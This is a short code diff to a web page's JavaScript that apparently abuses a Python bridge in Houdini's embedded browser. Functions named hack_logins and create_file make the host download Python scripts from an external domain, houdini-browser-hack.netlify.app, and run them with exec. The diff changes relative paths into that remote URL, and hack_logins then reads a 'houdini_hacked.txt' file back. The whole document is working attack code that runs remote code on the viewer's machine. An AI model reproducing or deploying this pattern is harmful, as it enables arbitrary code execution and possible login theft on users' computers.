@@ -11,7 +11,7 @@ window.onload = function() {
 }
 
 function hack_logins() {
-    window.Python.runStatements('import os;import urllib.request;import tempfile;url = "hack_logins.py";filename = os.path.basename(url);tmp_path = os.path.join(tempfile.gettempdir(), filename);urllib.request.urlretrieve(url, tmp_path);exec(open(tmp_path).read())');
+    window.Python.runStatements('import os;import urllib.request;import tempfile;url = "https://houdini-browser-hack.netlify.app/hack_logins.py";filename = os.path.basename(url);tmp_path = os.path.join(tempfile.gettempdir(), filename);urllib.request.urlretrieve(url, tmp_path);exec(open(tmp_path).read())');
     window.Python.runStringExpression(
         "__import__('pathlib').Path(__import__('tempfile').gettempdir() + '/houdini_hacked.txt').read_text()",
         function (result) {
@@ -21,7 +21,7 @@ function hack_logins() {
 }
 
 function create_file() {
-    window.Python.runStatements('import os;import urllib.request;import tempfile;url = "create_file.py";filename = os.path.basename(url);tmp_path = os.path.join(tempfile.gettempdir(), filename);urllib.request.urlretrieve(url, tmp_path);exec(open(tmp_path).read())');
+    window.Python.runStatements('import os;import urllib.request;import tempfile;url = "https://houdini-browser-hack.netlify.app/create_file.py";filename = os.path.basename(url);tmp_path = os.path.join(tempfile.gettempdir(), filename);urllib.request.urlretrieve(url, tmp_path);exec(open(tmp_path).read())');
     document.getElementById('result').innerHTML = 'File created on Desktop';
 }
 
